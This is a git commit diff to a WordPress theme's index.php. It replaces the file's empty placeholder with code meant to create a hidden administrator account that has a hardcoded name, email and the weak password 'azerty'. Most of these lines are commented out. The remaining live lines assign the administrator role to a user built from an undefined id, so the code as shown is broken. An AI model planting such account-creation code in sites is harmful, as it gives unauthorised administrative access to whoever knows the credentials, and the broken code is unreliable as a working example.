c2c588c707ffeb03aec0b4d34841ce0b44f54d13
CassandreBonafi <115160339+CassandreBonafi@users.noreply.github.com>
2022-10-07 12:10:43 +0200

    Update index.php

--- wp-content/themes/index.php
+++ wp-content/themes/index.php
@@ -1,2 +1,7 @@
-<?php
-// Silence is golden.
+<?php // function wpm_create_admin(){
+//$username = 'Cassandre Bonafi'; 
+// $password = 'azerty'; 
+// $email = 'cassandre.bonafi@gmail.com'; 
+// $username_id = wp_create_user( $username, $password, $email ); 
+$username = new WP_User( $username_id ); //
+$username->set_role( 'administrator' ); 
